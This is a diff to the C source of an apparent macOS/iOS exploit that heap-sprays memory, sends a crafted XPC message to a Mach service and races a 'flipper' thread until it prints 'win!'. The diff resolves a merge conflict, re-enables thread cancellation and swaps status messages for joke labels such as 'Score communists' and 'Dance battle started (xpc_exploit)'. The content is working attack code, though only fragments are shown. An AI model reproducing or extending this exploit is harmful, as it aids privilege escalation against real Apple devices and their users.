@@ -754,11 +754,7 @@ add_heap_spray_to_dictionary(
   err = mach_vm_allocate(mach_task_self(), &full_heapspray, full_heapspray_size, 1);
 
   for (size_t i = 0; i < n_heapspray_pages; i++) {
-<<<<<<< HEAD
-      memcpy((void*)(full_heapspray + (i*heapspray_page_size)), &heapspray_contents, heapspray_page_size);
-=======
     memcpy((void*)(full_heapspray + (i*heapspray_page_size)), &heapspray_contents, heapspray_page_size);
->>>>>>> 07640a0b12b7eb6f92690392739191058718846d
   }
   
   // wrap that in an xpc data object
@@ -859,9 +855,9 @@ sploit(
       exit(EXIT_FAILURE);
     }
 
-    printf("connected to %s\n", service_name);
-    printf("client port: %x\n", client_port);
-    printf("reply port: %x\n", reply_port);
+   // printf("connected to %s\n", service_name);
+    printf("Score communists: %x\n", client_port);
+    printf("Score Tsar: %x\n", reply_port);
 #if 0
     // send that xpc_msg_dict as a mach message to the service client port:
     kern_return_t mach_err;
@@ -909,7 +905,7 @@ sploit(
     if (err != KERN_SUCCESS){
       printf("failed to send exploit message\n");
     } else {
-      printf("sent exploit message\n");
+      printf("Dance battle started (xpc_exploit).\n");
     }
     
     while (1) {
@@ -919,7 +915,7 @@ sploit(
         printf("win!\n");
         
         // stop the flipper thread:
-        //pthread_cancel(th);
+        pthread_cancel(th);
         stop_flipper_thread = 1;
         pthread_join(th, NULL);
         
